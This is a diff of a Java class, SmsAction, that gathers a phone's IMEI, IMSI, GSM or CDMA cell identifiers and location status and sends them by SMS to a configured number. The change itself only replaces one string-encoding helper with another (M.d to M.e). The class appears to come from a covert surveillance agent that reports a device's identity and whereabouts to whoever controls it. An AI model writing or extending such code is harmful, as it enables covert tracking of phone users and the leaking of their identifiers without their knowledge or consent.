@@ -107,8 +107,8 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 				}
 
 				if (Device.isGprs()) {
-					sb.append(M.d("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-					sb.append(M.d("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					sb.append(M.e("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					sb.append(M.e("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				text = sb.toString();
@@ -162,7 +162,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 				return true;
 
 			case TYPE_SIM:
-				text = M.d("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
+				text = M.e("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
 				sendSMS(text);
 				return true;
 
@@ -190,7 +190,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	 */
 	private void errorLocation() {
 		if (!getCellPosition()) {
-			sendSMS(M.d("Cell and GPS info not available")); //$NON-NLS-1$
+			sendSMS(M.e("Cell and GPS info not available")); //$NON-NLS-1$
 		}
 	}
 
@@ -203,13 +203,13 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		final CellInfo c = Device.getCellInfo();
 
 		if (c.cdma && c.valid) {
-			text = M.d("SID: ") + c.sid + M.d(", NID: ") + c.nid + M.d(", BID: ") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			text = M.e("SID: ") + c.sid + M.e(", NID: ") + c.nid + M.e(", BID: ") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			sendSMS(text);
 			return true;
 		}
 
 		if (c.gsm && c.valid) {
-			text = M.d("CC: ") + c.mcc + M.d(", MNC: ") + c.mnc + M.d(", LAC: ") + c.lac + M.d(", CID: ") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			text = M.e("CC: ") + c.mcc + M.e(", MNC: ") + c.mnc + M.e(", LAC: ") + c.lac + M.e(", CID: ") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 			sendSMS(text);
 			return true;
 		}
@@ -251,9 +251,9 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
 
-		sb.append(M.d("Sms type: ") + type); //$NON-NLS-1$
-		sb.append(M.d(" number: ") + number); //$NON-NLS-1$
-		sb.append(M.d(" text: ") + text); //$NON-NLS-1$
+		sb.append(M.e("Sms type: ") + type); //$NON-NLS-1$
+		sb.append(M.e(" number: ") + number); //$NON-NLS-1$
+		sb.append(M.e(" text: ") + text); //$NON-NLS-1$
 
 		return sb.toString();
 	}
